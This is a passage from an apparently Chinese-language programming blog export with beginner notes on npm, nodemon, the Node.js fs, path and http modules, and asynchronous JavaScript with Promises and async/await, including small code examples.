class="punctuation">:</span> <span class="string">&quot;demo01&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nodetest01.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><code>npm i 软件包名</code>：下载软件包，会生成<code>node_modules</code>、<code>package-lock.json</code>文件和文件夹</li></ol><ul><li>npm会将记录到的包信息写入<code>package.json</code>文件</li><li><code>package-lock.json</code>固化软件包的版本</li><li><code>node_modules</code>是软件包的源码</li></ul><ol start="3"><li>导入使用</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dayjs = <span class="built_in">require</span>(<span class="string">&#x27;dayjs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> nowDate = <span class="title function_">dayjs</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dayjs);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nowDate);</span><br></pre></td></tr></table></figure><h2 id="安装所有依赖"><a href="#安装所有依赖" class="headerlink" title="安装所有依赖"></a>安装所有依赖</h2><p><strong>问题</strong>：当下载别人的项目时，没有<code>node_modules</code>文件夹，不能正常调用软件包</p><p><strong>原因</strong>：通常项目当中不放<code>node_modules</code>文件夹，是因为自己用npm下载比磁盘拷贝快，所以需要自己下载</p><p><strong>解决</strong>：</p><ol><li><code>package.json</code>文件当中包含使用的包信息，<code>package-lock.json</code>固化软件包的版本</li><li>项目终端输入命令： <code>npm i</code>，就可以下载全部记录的软件包了</li></ol><h2 id="全局软件包-nodemon"><a href="#全局软件包-nodemon" class="headerlink" title="全局软件包 nodemon"></a>全局软件包 nodemon</h2><p><strong>软件包区别</strong>：</p><ul><li>本地软件包：当前项目内使用，封装属性和方法，存在于<code>node_modules</code></li><li>全局软件包：本机所有项目使用，封装命令和工具，存在于系统设置的位置</li></ul><p>nodemon 作用：替代 node 命令，检测代码更改，<strong>自动重启程序</strong></p><p><strong>使用</strong>： </p><ol><li>安装：<code>npm i nodemon -g</code>（-g 代表安装到全局环境中） </li><li>运行：<code>nodemon 待执行的目标 js 文件</code></li></ol><p><strong>注意</strong>：</p><ul><li>可能出现下图错误，是因为系统禁止运行脚本导致的，通过设置执行策略为RemoteSigned，可以解决脚本运行的限制。</li><li>在终端管理员模式中，输入一下命令：set-ExecutionPolicy RemoteSigned</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240320165622.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.js-入门</title>
      <link href="/2024/03/14/Node.js-%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/14/Node.js-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Node-js-简介"><a href="#Node-js-简介" class="headerlink" title="Node.js 简介"></a>Node.js 简介</h1><p><strong>定义</strong>： <code>Node.js</code>是一个跨平台JavaScript运行环境，使开发者可以搭建服务器的JavaScript应用程序</p><p><strong>作用</strong>：使用<code>Node.js</code>编写服务器端程序</p><ul><li>编写数据接口，提供网页资源浏览功能等等</li><li>前端工程化：为后续学习vue和React等框架做铺垫</li></ul><p><strong>前端工程化</strong>：开发项目直到上线，过程中集成的所有工具和技术，Node.js是前端工程化的基础（因为Node.js可以主动读取前端代码内容）</p><ol><li>浏览器能够执行JS代码，依靠的是内核中的V8引擎（C++程序）</li><li>Node.js是基于Chrome V8引擎进行封装（运行环境）</li><li>区别是都支持ECMAScript标准语法，Node.js有独立的API，但是Node.js环境没有DOM和BOM等</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314210049.png" alt="image.png"></p><h1 id="Node-js-安装"><a href="#Node-js-安装" class="headerlink" title="Node.js 安装"></a>Node.js 安装</h1><p>Node.js下载：<a href="https://nodejs.org/en/download">官网下载地址</a></p><p>注意事项：</p><ol><li>安装在非中文路径下</li><li>无需勾选自动安装其他配套软件</li></ol><p>成功验证：</p><ol><li>在cmd终端，输入<code>node -v</code>命令查看版本号</li><li>显示版本号即为安装成功</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314210517.png" alt="image.png"></p><h1 id="Node-js-使用"><a href="#Node-js-使用" class="headerlink" title="Node.js 使用"></a>Node.js 使用</h1><p><strong>操作</strong>：新建<code>.js</code>文件，编写代码后在node环境下执行</p><p><strong>命令</strong>：在cmd终端当前目录下，输入<code>node xxx.js</code>，执行<code>.js</code>文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello Node.js&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314211331.png" alt="image.png"></p><h1 id="fs模块-读写文件"><a href="#fs模块-读写文件" class="headerlink" title="fs模块-读写文件"></a>fs模块-读写文件</h1><p><strong>模块</strong>：类似插件，封装了方法&#x2F;属性 </p><p><strong>fs 模块</strong>：封装了与本机文件系统进行交互的方法&#x2F;属性 </p><p><strong>语法</strong>： </p><ol><li>加载 fs 模块对象</li><li>写入文件内容 </li><li>读取文件内容</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314220311.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入fs模块</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="comment">// 调用writeFile 写入内容</span></span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="string">&#x27;Hello Node.js&#x27;</span>, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写入成功&#x27;</span>)</span><br><span class="line">    <span class="comment">// 调用readFile 读取内容</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">      <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>这么写的原因是writeFile和readFile都是异步操作，所以无法确定谁会先执行完成。我试了几次都是先读取才写入，所以写了判断条件，写入完成才能读取。</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314223026.png" alt="image.png"></p><h1 id="path模块-路径处理"><a href="#path模块-路径处理" class="headerlink" title="path模块-路径处理"></a>path模块-路径处理</h1><p><strong>问题</strong>：Node.js 代码中，相对路径是根据终端所在路径来查找的，可能无法找到你想要的文件</p><p><strong>建议</strong>：在 Node.js 代码中，使用绝对路径 </p><p><strong>补充</strong>：<code>__dirname</code> 内置变量（获取当前模块目录-绝对路径） </p><ul><li>windows： D:\备课代码\3-B站课程\03_Node.js与Webpack\03-code\03 </li><li>mac： &#x2F;Users&#x2F;xxx&#x2F;Desktop&#x2F;备课代码&#x2F;3-B站课程&#x2F;03_Node.js与Webpack&#x2F;03-code&#x2F;03</li></ul><p><strong>注意</strong>：path.join() 会使用特定于平台的分隔符，作为定界符，将所有给定的路径片段连接在一起 </p><p><strong>语法</strong>： </p><ol><li>加载 path 模块 </li><li>使用 <code>path.join</code> 方法，拼接路径</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(__dirname) <span class="comment">// 打印文件当前目录</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>) <span class="comment">// 加载path模块</span></span><br><span class="line"><span class="keyword">const</span> pathStr = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;hello.txt&#x27;</span>) <span class="comment">// 拼接绝对地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pathStr)</span><br><span class="line">fs.<span class="title function_">readFile</span>(pathStr, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123; <span class="comment">// 读取文件</span></span><br><span class="line">  <span class="keyword">if</span>(err) <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">  <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>((data.<span class="title function_">toString</span>()));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="http模块-创建Web服务"><a href="#http模块-创建Web服务" class="headerlink" title="http模块-创建Web服务"></a>http模块-创建Web服务</h1><p><strong>需求</strong>：创建 Web 服务并响应内容给浏览器 </p><p><strong>步骤</strong>： </p><ol><li>加载 http 模块，创建 Web 服务对象 </li><li>监听 request 请求事件，设置响应头和响应体 </li><li>配置端口号并启动 Web 服务 </li><li>浏览器请求 <code>http://localhost:3000</code> 测试（localhost：固定代表本机的域名）</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载http模块，创建Web服务器对象</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br><span class="line"><span class="comment">// 监听request请求事件，设置响应头和响应体</span></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 设置响应头-内容类型-普通文本以及中文编码格式</span></span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="comment">// 设置响应体内容，结束本次请求与响应</span></span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;欢迎使用 Node.js 和 http 模块创建的 Web 服务&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 配置端口号并启动Web服务</span></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web服务启动成功&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314225506.png" alt="image.png"></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314225527.png" alt="image.png"></p><h2 id="访问本地网页资源"><a href="#访问本地网页资源" class="headerlink" title="访问本地网页资源"></a>访问本地网页资源</h2><p><strong>步骤</strong>：</p><ol><li>基于http模块，创建Web服务器</li><li>使用req.url获取请求路径，然后响应请求资源的内容</li><li>运行Web服务，使用浏览器发起请求</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// req是HTTP请求（request） res是HTTP响应（response）</span></span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span> === <span class="string">&#x27;/test05-xm14p.html&#x27;</span>)&#123; <span class="comment">// 辨别地址，req.url获取请求资源路径</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/test05-xm14p.html&#x27;</span>), <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 响应头，设置text/html，这样才能识别html文件</span></span><br><span class="line">      res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">      res.<span class="title function_">end</span>(data.<span class="title function_">toString</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;您访问的资源路径不存在&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 配置端口号并启动Web服务</span></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web服务启动成功&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240314231906.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX-进阶</title>
      <link href="/2024/03/14/AJAX-%E8%BF%9B%E9%98%B6/"/>
      <url>/2024/03/14/AJAX-%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h1><ol><li><strong>同步代码</strong>：逐行执行，需原地等待结果后，才继续向下执行</li><li><strong>异步代码</strong>：调用后耗时，不阻塞代码继续执行（不必原地等待），在将来完成后触发回调函数传递结果</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--这里用延时器模拟需要异步的操作--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> result = <span class="number">0</span> + <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>结果就是先打印1、4，两秒之后打印2，最后点击按钮打印3</li></ul><p><strong>常见的异步操作</strong>：</p><ol><li>回调函数</li><li><code>Promise</code></li><li><code>async/await</code></li><li>事件监听</li><li>定时器</li><li><code>XMLHttpRequest</code>和<code>Fetch API</code>等网络请求</li><li>Web Workers（Web Worker API提供了从主执行线程分离并在后台运行脚本的能力，即在后台运行JavaScript代码，不影响页面UI的渲染和响应能力）</li><li><code>Node.js</code>中的异步I&#x2F;O操作（如读写文件、网络请求等）</li></ol><h1 id="回调函数地狱"><a href="#回调函数地狱" class="headerlink" title="回调函数地狱"></a>回调函数地狱</h1><p><strong>概念</strong>：在回调函数中嵌套回调函数，一直嵌套下去就形成了回调函数地狱</p><p>例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123; <span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/province&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">const</span> pname = result.<span class="property">data</span>.<span class="property">list</span>[<span class="number">0</span>]</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.province&#x27;</span>).<span class="property">innerHTML</span> = pname</span><br><span class="line"><span class="comment">// 获取第一个省份默认下属的第一个城市名字</span></span><br><span class="line"><span class="title function_">axios</span>(&#123; <span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/city&#x27;</span>, <span class="attr">params</span>: &#123; pname &#125; &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">const</span> cname = result.<span class="property">data</span>.<span class="property">list</span>[<span class="number">0</span>]</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.city&#x27;</span>).<span class="property">innerHTML</span> = cname</span><br><span class="line"><span class="comment">// 获取第一个城市默认下属第一个地区名字</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;<span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/area&#x27;</span>, <span class="attr">params</span>: &#123;pname, cname&#125;&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.area&#x27;</span>).<span class="property">innerHTML</span> = result.<span class="property">data</span>.<span class="property">list</span>[<span class="number">0</span>]</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>以上代码是实现获取省份名称之后获取城市名称，再获取镇区名称的功能。出现了回调函数地狱问题。</p><p>虽然这样的代码可以正常运行，但存在以下问题：</p><ol><li><strong>可读性差</strong>：嵌套过多的回调函数使得代码难以阅读和理解，代码的意图变得模糊，不易于维护。</li><li><strong>难以调试</strong>：回调函数地狱使得代码执行流程变得非常复杂，导致难以进行调试。当出现错误时，追踪问题和定位 bug 变得更加困难。</li><li><strong>缺乏可扩展性</strong>：如果需要对现有代码进行修改或添加新功能，由于代码结构复杂，很容易引入更多的错误。而且，由于函数之间的紧密耦合，修改会<strong>牵一发而动全身</strong>。</li><li><strong>可维护性差</strong>：回调函数地狱中的代码难以维护和修改，因为任何一处的更改都可能会导致意想不到的后果。这增加了代码维护的成本和风险。</li></ol><ul><li>这个时候就需要<code>Promise</code>、<code>async/await</code> 等异步编程的改进方法来管理异步操作，使代码结构更清晰、可读性更强、易于维护和扩展。</li></ul><h1 id="Promise-链式调用"><a href="#Promise-链式调用" class="headerlink" title="Promise-链式调用"></a>Promise-链式调用</h1><p><strong>概念</strong>：依靠 <code>then()</code> 方法会返回一个新生成的 <code>Promise</code> 对象特性，继续串联下一环任务，直到结束 </p><p><strong>细节</strong>：<code>then()</code> 回调函数中的返回值，会影响新生成的 <code>Promise</code> 对象最终状态和结果 </p><p><strong>好处</strong>：通过链式调用，解决回调函数嵌套问题</p><p><strong>做法</strong>：每个 <code>Promise</code> 对象中管理一个异步任务，用 <code>then</code> 返回新的 <code>Promise</code> 对象，串联起来</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/image-20230222173851738.png" alt="image-20230222173851738.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Promise对象-模拟请求省份名字</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="title function_">resolve</span>(<span class="string">&#x27;广东省&#x27;</span>)</span><br><span class="line">&#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 2. 获取省份名字</span></span><br><span class="line"><span class="keyword">const</span> p2 = p.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br><span class="line"><span class="comment">// 3. 创建Promise对象-模拟请求城市名字</span></span><br><span class="line"><span class="comment">// return Promise对象最终状态和结果，影响到新的Promise对象</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="title function_">resolve</span>(result + <span class="string">&#x27;---东莞市&#x27;</span>)</span><br><span class="line">&#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 4. 获取城市名字</span></span><br><span class="line">p2.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// then()原地的结果是一个新的Promise对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2 === p)</span><br></pre></td></tr></table></figure><h1 id="async和await"><a href="#async和await" class="headerlink" title="async和await"></a>async和await</h1><p><strong>定义</strong>：<code>async</code>函数是使用<code>async</code>关键字声明的函数。<code>async</code>函数是<code>AsyncFunction</code>构造函数的实例，并且其中允许使用<code>await</code>关键字。<code>async</code>和<code>await</code>关键字让我们可以用一种更简洁的方式写出基于Promise的异步行为，而无需刻意地链式调动Promise</p><p><strong>概念</strong>：在<code>async</code>函数内，使用<code>await</code>关键字<strong>取代</strong><code>then</code>函数，<strong>等待</strong>获取<code>Promise</code>对象<strong>成功状态</strong>的结果值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 别忘了引入axios.js文件</span></span><br><span class="line"><span class="comment">// 在函数前加async，在需要等待Promise对象结果的地方前加await，就会等待结果并赋值</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> pObj = <span class="keyword">await</span> <span class="title function_">axios</span>(&#123; <span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/province&#x27;</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> pname = pObj.<span class="property">data</span>.<span class="property">list</span>[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">const</span> cObj = <span class="keyword">await</span> <span class="title function_">axios</span>(&#123; <span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/city&#x27;</span>, <span class="attr">params</span>: &#123; pname &#125; &#125;)</span><br><span class="line"><span class="keyword">const</span> cname = cObj.<span class="property">data</span>.<span class="property">list</span>[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">const</span> aObj = <span class="keyword">await</span> <span class="title function_">axios</span>(&#123; <span class="attr">url</span>: <span class="string">&#x27;http://hmajax.itheima.net/api/area&#x27;</span>, <span class="attr">params</span>: &#123; pname, cname &#125; &#125;)</span><br><span class="line"><span class="keyword">const</span> areaName = aObj.<span class="property">data</span>.<span class="property">list</span>[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pname)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cname)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(areaName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getData</span>()</span><br></pre></td></tr></table></figure><h2 id="错误捕获"><a 